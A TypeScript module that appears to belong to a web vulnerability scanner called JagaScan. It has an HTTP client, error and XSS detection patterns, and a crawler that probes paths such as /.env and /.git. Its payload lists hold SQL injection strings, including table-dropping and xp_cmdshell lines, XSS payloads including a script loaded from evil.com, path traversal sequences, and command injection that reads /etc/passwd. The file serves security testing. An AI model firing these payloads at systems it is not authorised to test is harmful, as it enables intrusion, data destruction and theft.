import axios, { AxiosInstance, AxiosResponse } from 'axios';
import * as cheerio from 'cheerio';
import * as crypto from 'crypto-js';

/**
 * HTTP Client for real web requests
 */
export class HttpClient {
  private client: AxiosInstance;
  private cookies: Map<string, string> = new Map();
  private headers: Record<string, string> = {};

  constructor(options: {
    timeout?: number;
    userAgent?: string;
    followRedirects?: boolean;
    maxRedirects?: number;
  } = {}) {
    this.client = axios.create({
      timeout: options.timeout || 30000,
      maxRedirects: options.followRedirects ? (options.maxRedirects || 5) : 0,
      validateStatus: () => true, // Don't throw on any status code
      headers: {
        'User-Agent': options.userAgent || 'JagaScan/1.0 (Security Scanner)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        ...this.headers
      }
    });

    // Add request interceptor to include cookies
    this.client.interceptors.request.use((config) => {
      if (this.cookies.size > 0) {
        const cookieString = Array.from(this.cookies.entries())
          .map(([key, value]) => `${key}=${value}`)
          .join('; ');
        config.headers['Cookie'] = cookieString;
      }
      return config;
    });

    // Add response interceptor to capture cookies
    this.client.interceptors.response.use((response) => {
      const setCookieHeader = response.headers['set-cookie'];
      if (setCookieHeader) {
        setCookieHeader.forEach((cookie: string) => {
          const [cookiePair] = cookie.split(';');
          const [name, value] = cookiePair.split('=');
          if (name && value) {
            this.cookies.set(name.trim(), value.trim());
          }
        });
      }
      return response;
    });
  }

  async get(url: string, config: any = {}): Promise<AxiosResponse> {
    return await this.client.get(url, config);
  }

  async post(url: string, data: any = {}, config: any = {}): Promise<AxiosResponse> {
    return await this.client.post(url, data, config);
  }

  async put(url: string, data: any = {}, config: any = {}): Promise<AxiosResponse> {
    return await this.client.put(url, data, config);
  }

  async delete(url: string, config: any = {}): Promise<AxiosResponse> {
    return await this.client.delete(url, config);
  }

  setHeader(name: string, value: string): void {
    this.headers[name] = value;
    this.client.defaults.headers[name] = value;
  }

  setCookie(name: string, value: string): void {
    this.cookies.set(name, value);
  }

  getCookies(): Map<string, string> {
    return new Map(this.cookies);
  }

  clearCookies(): void {
    this.cookies.clear();
  }
}

/**
 * Response analyzer for vulnerability detection
 */
export class ResponseAnalyzer {
  /**
   * Analyze response for potential vulnerabilities
   */
  static analyzeResponse(response: AxiosResponse): {
    hasErrorMessages: boolean;
    hasSQLErrors: boolean;
    hasXSSReflection: boolean;
    hasDebugInfo: boolean;
    hasDirectoryListing: boolean;
    hasBackupFiles: boolean;
    headers: Record<string, string>;
    statusCode: number;
    responseTime: number;
    contentType: string;
    contentLength: number;
  } {
    const data = response.data || '';
    const headers = response.headers || {};
    const statusCode = response.status;

    // Convert headers to Record<string, string>
    const normalizedHeaders: Record<string, string> = {};
    Object.entries(headers).forEach(([key, value]) => {
      normalizedHeaders[key] = String(value);
    });

    return {
      hasErrorMessages: this.detectErrorMessages(data),
      hasSQLErrors: this.detectSQLErrors(data),
      hasXSSReflection: this.detectXSSReflection(data),
      hasDebugInfo: this.detectDebugInfo(data),
      hasDirectoryListing: this.detectDirectoryListing(data),
      hasBackupFiles: this.detectBackupFiles(data),
      headers: normalizedHeaders,
      statusCode,
      responseTime: response.config?.timeout || 0,
      contentType: String(headers['content-type'] || ''),
      contentLength: parseInt(String(headers['content-length'])) || data.length
    };
  }

  private static detectErrorMessages(data: string): boolean {
    const errorPatterns = [
      /error/i,
      /exception/i,
      /warning/i,
      /fatal/i,
      /parse error/i,
      /syntax error/i,
      /undefined variable/i,
      /notice:/i
    ];

    return errorPatterns.some(pattern => pattern.test(data));
  }

  private static detectSQLErrors(data: string): boolean {
    const sqlErrorPatterns = [
      /you have an error in your sql syntax/i,
      /warning.*mysql_/i,
      /valid mysql result/i,
      /mysqlclient version/i,
      /postgresql.*error/i,
      /warning.*pg_/i,
      /valid postgresql result/i,
      /oracle.*error/i,
      /microsoft.*odbc.*sql server.*driver/i,
      /sqlite.*error/i,
      /sqlstate/i,
      /ora-\d{5}/i,
      /microsoft ole db provider for odbc drivers/i
    ];

    return sqlErrorPatterns.some(pattern => pattern.test(data));
  }

  private static detectXSSReflection(data: string): boolean {
    const xssPatterns = [
      /<script[^>]*>.*?<\/script>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<iframe[^>]*>/gi,
      /<object[^>]*>/gi,
      /<embed[^>]*>/gi
    ];

    return xssPatterns.some(pattern => pattern.test(data));
  }

  private static detectDebugInfo(data: string): boolean {
    const debugPatterns = [
      /debug/i,
      /stack trace/i,
      /backtrace/i,
      /call stack/i,
      /line \d+ in/i,
      /file.*line.*function/i,
      /var_dump/i,
      /print_r/i
    ];

    return debugPatterns.some(pattern => pattern.test(data));
  }

  private static detectDirectoryListing(data: string): boolean {
    const listingPatterns = [
      /index of \//i,
      /directory listing for/i,
      /<title>directory listing/i,
      /parent directory/i,
      /<a href="\.\.\/?">/i
    ];

    return listingPatterns.some(pattern => pattern.test(data));
  }

  private static detectBackupFiles(data: string): boolean {
    const backupPatterns = [
      /\.bak$/i,
      /\.backup$/i,
      /\.old$/i,
      /\.orig$/i,
      /\.tmp$/i,
      /~$/i,
      /\.zip$/i,
      /\.tar\.gz$/i
    ];

    return backupPatterns.some(pattern => pattern.test(data));
  }

  /**
   * Extract forms from HTML response
   */
  static extractForms(html: string): Array<{
    action: string;
    method: string;
    inputs: Array<{ name: string; type: string; value: string }>;
    hasCSRFToken: boolean;
  }> {
    const $ = cheerio.load(html);
    const forms: any[] = [];

    $('form').each((_, form) => {
      const $form = $(form);
      const action = $form.attr('action') || '';
      const method = ($form.attr('method') || 'GET').toUpperCase();
      const inputs: any[] = [];
      let hasCSRFToken = false;

      $form.find('input, select, textarea').each((_, input) => {
        const $input = $(input);
        const name = $input.attr('name') || '';
        const type = $input.attr('type') || 'text';
        const value = $input.attr('value') || '';

        if (name) {
          inputs.push({ name, type, value });
          
          // Check for CSRF tokens
          if (name.toLowerCase().includes('csrf') || 
              name.toLowerCase().includes('token') ||
              type === 'hidden') {
            hasCSRFToken = true;
          }
        }
      });

      forms.push({
        action,
        method,
        inputs,
        hasCSRFToken
      });
    });

    return forms;
  }

  /**
   * Extract links from HTML response
   */
  static extractLinks(html: string, baseUrl: string): string[] {
    const $ = cheerio.load(html);
    const links: string[] = [];

    $('a[href]').each((_, link) => {
      const href = $(link).attr('href');
      if (href) {
        try {
          const url = new URL(href, baseUrl);
          links.push(url.toString());
        } catch {
          // Invalid URL, skip
        }
      }
    });

    return [...new Set(links)]; // Remove duplicates
  }
}

/**
 * Payload generator for vulnerability testing
 */
export class PayloadGenerator {
  /**
   * Generate SQL injection payloads
   */
  static getSQLInjectionPayloads(): string[] {
    return [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "') OR ('1'='1",
      "') OR ('1'='1' --",
      "1' OR '1'='1",
      "1' OR '1'='1' --",
      "admin'--",
      "admin'/*",
      "' OR 1=1--",
      "' OR 1=1#",
      "' OR 1=1/*",
      "') OR 1=1--",
      "') OR 1=1#",
      "1' AND 1=1--",
      "1' AND 1=2--",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "'; DROP TABLE users; --",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND SUBSTRING(@@version,1,1)='5'--",
      "' AND (SELECT COUNT(*) FROM users)>0--",
      "1' WAITFOR DELAY '00:00:05'--",
      "1'; WAITFOR DELAY '00:00:05'--"
    ];
  }

  /**
   * Generate XSS payloads
   */
  static getXSSPayloads(): string[] {
    return [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "<iframe src='javascript:alert(\"XSS\")'></iframe>",
      "<body onload=alert('XSS')>",
      "<input onfocus=alert('XSS') autofocus>",
      "<select onfocus=alert('XSS') autofocus>",
      "<textarea onfocus=alert('XSS') autofocus>",
      "<keygen onfocus=alert('XSS') autofocus>",
      "<video><source onerror='alert(\"XSS\")'>",
      "<audio src=x onerror=alert('XSS')>",
      "<details open ontoggle=alert('XSS')>",
      "<marquee onstart=alert('XSS')>",
      "'\"><script>alert('XSS')</script>",
      "\"><script>alert('XSS')</script>",
      "'><script>alert('XSS')</script>",
      "</script><script>alert('XSS')</script>",
      "<script>alert(String.fromCharCode(88,83,83))</script>",
      "<script>alert(/XSS/)</script>",
      "<ScRiPt>alert('XSS')</ScRiPt>",
      "<script>alert('XSS');//",
      "<script>alert('XSS');</script>",
      "<script src='http://evil.com/xss.js'></script>",
      "<<SCRIPT>alert('XSS');//<</SCRIPT>"
    ];
  }

  /**
   * Generate Directory Traversal payloads
   */
  static getDirectoryTraversalPayloads(): string[] {
    return [
      "../",
      "../../",
      "../../../",
      "../../../../",
      "../../../../../",
      "../../../../../../",
      "../../../../../../../",
      "../../../../../../../../",
      "../../../../../../../../../",
      "../../../../../../../../../../",
      "..\\",
      "..\\..\\",
      "..\\..\\..\\",
      "..\\..\\..\\..\\",
      "..\\..\\..\\..\\..\\",
      "..\\..\\..\\..\\..\\..\\",
      "..\\..\\..\\..\\..\\..\\..\\",
      "..\\..\\..\\..\\..\\..\\..\\..\\",
      "%2e%2e/",
      "%2e%2e%2f",
      "..%2f",
      "%2e%2e\\",
      "..%5c",
      "%252e%252e%252f",
      "..%c0%af",
      "..%c1%9c"
    ];
  }

  /**
   * Generate LDAP injection payloads
   */
  static getLDAPInjectionPayloads(): string[] {
    return [
      "*",
      "*)(&",
      "*)(|(objectClass=*",
      "*))(|(objectClass=*",
      "*))%00",
      "admin)(&",
      "admin))(|(objectClass=*"
    ];
  }

  /**
   * Generate Command Injection payloads
   */
  static getCommandInjectionPayloads(): string[] {
    return [
      "; ls",
      "| ls",
      "& ls",
      "&& ls",
      "|| ls",
      "; dir",
      "| dir",
      "& dir",
      "&& dir",
      "|| dir",
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "; type C:\\windows\\system32\\drivers\\etc\\hosts",
      "| type C:\\windows\\system32\\drivers\\etc\\hosts",
      "`ls`",
      "$(ls)",
      "${ls}",
      "; sleep 5",
      "| sleep 5",
      "; ping -c 4 127.0.0.1",
      "| ping -c 4 127.0.0.1"
    ];
  }
}

/**
 * URL and endpoint discovery
 */
export class URLDiscovery {
  private client: HttpClient;
  private baseUrl: string;

  constructor(baseUrl: string, client: HttpClient) {
    this.baseUrl = baseUrl;
    this.client = client;
  }

  /**
   * Discover common directories and files
   */
  async discoverCommonPaths(): Promise<Array<{ url: string; status: number; exists: boolean }>> {
    const commonPaths = [
      '/admin',
      '/administrator',
      '/wp-admin',
      '/phpmyadmin',
      '/backup',
      '/backups',
      '/config',
      '/database',
      '/db',
      '/log',
      '/logs',
      '/temp',
      '/tmp',
      '/upload',
      '/uploads',
      '/test',
      '/testing',
      '/dev',
      '/development',
      '/api',
      '/api/v1',
      '/api/v2',
      '/swagger',
      '/docs',
      '/documentation',
      '/.env',
      '/.git',
      '/.svn',
      '/robots.txt',
      '/sitemap.xml',
      '/crossdomain.xml',
      '/clientaccesspolicy.xml',
      '/web.config',
      '/httpd.conf',
      '/.htaccess',
      '/composer.json',
      '/package.json',
      '/Gemfile',
      '/requirements.txt'
    ];

    const results: Array<{ url: string; status: number; exists: boolean }> = [];

    for (const path of commonPaths) {
      try {
        const url = new URL(path, this.baseUrl).toString();
        const response = await this.client.get(url);
        
        results.push({
          url,
          status: response.status,
          exists: response.status < 400
        });

        // Add small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (error) {
        results.push({
          url: new URL(path, this.baseUrl).toString(),
          status: 0,
          exists: false
        });
      }
    }

    return results;
  }

  /**
   * Spider and crawl website for more URLs
   */
  async crawlWebsite(maxDepth: number = 2, maxPages: number = 50): Promise<Set<string>> {
    const visitedUrls = new Set<string>();
    const urlsToVisit = new Set<string>([this.baseUrl]);
    const allUrls = new Set<string>();
    let currentDepth = 0;

    while (currentDepth < maxDepth && visitedUrls.size < maxPages && urlsToVisit.size > 0) {
      const currentUrls = Array.from(urlsToVisit);
      urlsToVisit.clear();

      for (const url of currentUrls) {
        if (visitedUrls.has(url) || visitedUrls.size >= maxPages) {
          continue;
        }

        try {
          visitedUrls.add(url);
          const response = await this.client.get(url);
          
          if (response.status === 200 && 
              response.headers['content-type']?.includes('text/html')) {
            
            const links = ResponseAnalyzer.extractLinks(response.data, url);
            
            for (const link of links) {
              const linkUrl = new URL(link);
              const baseUrlObj = new URL(this.baseUrl);
              
              // Only follow links from the same domain
              if (linkUrl.hostname === baseUrlObj.hostname) {
                allUrls.add(link);
                if (!visitedUrls.has(link)) {
                  urlsToVisit.add(link);
                }
              }
            }
          }

          // Add delay to be respectful
          await new Promise(resolve => setTimeout(resolve, 200));
        } catch (error) {
          console.error(`Error crawling ${url}:`, error);
        }
      }

      currentDepth++;
    }

    return allUrls;
  }
}
